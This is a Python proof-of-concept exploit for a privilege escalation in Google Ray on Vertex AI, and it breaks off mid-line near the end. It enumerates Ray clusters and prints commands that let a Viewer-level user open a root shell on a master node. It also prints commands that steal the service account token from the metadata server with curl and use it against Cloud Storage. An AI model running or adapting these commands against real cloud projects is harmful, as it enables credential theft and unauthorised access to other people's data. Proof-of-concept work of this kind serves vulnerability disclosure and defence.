#!/usr/bin/env python3
"""
PoC for Google Ray on Vertex AI Privilege Escalation.
Author: Tu Nombre
Description: This script demonstrates how a user with the 'aiplatform.persistentResources.list'
permission can enumerate Ray clusters and gain root access to the master node's shell,
bypassing the intended "Viewer" role restrictions.
"""

import argparse
import subprocess
import sys
from google.cloud import aiplatform

def list_ray_clusters(project_id: str, region: str):
    """Lists all available Ray clusters (Persistent Resources) in the project."""
    print(f"[*] Attempting to list Ray clusters in project '{project_id}' and region '{region}'...")
    
    try:
        aiplatform.init(project=project_id, location=region)
        persistent_resources = aiplatform.PersistentResource.list()

        if not persistent_resources:
            print("[-] No Ray clusters (Persistent Resources) found.")
            return []

        print(f"\n[+] Found {len(persistent_resources)} Ray cluster(s):")
        clusters_info = []
        for resource in persistent_resources:
            resource_name = resource.resource_name.split('/')[-1]
            print(f"  - Name: {resource_name}")
            print(f"    State: {resource.state.name}")
            clusters_info.append({"name": resource_name, "state": resource.state.name})
        
        return clusters_info

    except Exception as e:
        print(f"[!] Error listing clusters: {e}")
        print("[!] Ensure 'gcloud auth application-default login' has been run and you have the necessary permissions.")
        return []

def generate_exploit_commands(project_id: str, region: str, cluster_name: str):
    """Generates the commands to access the Ray cluster's master node shell."""
    print("\n--- Exploit Commands ---")
    print("The following commands can be run by an attacker with 'Viewer' privileges to get root access.")
    print("1. Open the interactive shell for the master node:")
    print(f"   gcloud ai persistent-resources open-ray-cluster --project={project_id} --region={region} --resource-name={cluster_name}")
    print("\n2. Once inside the shell, steal the service account token:")
    print("   curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'")
    print("\n3. Use the token to access GCS or BigQuery:")
    print("   export TOKEN=\$(curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' | jq -r '.access_token')")
    print("   gsutil ls -H 'Authorization: Bearer \$TOKEN'")
    print("------------------------")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC for Ray on Vertex AI Privilege Escalation.")
    parser.add_argument("--project-id", required=True, help="Your Google Cloud Project ID.")
    parser.add_argument
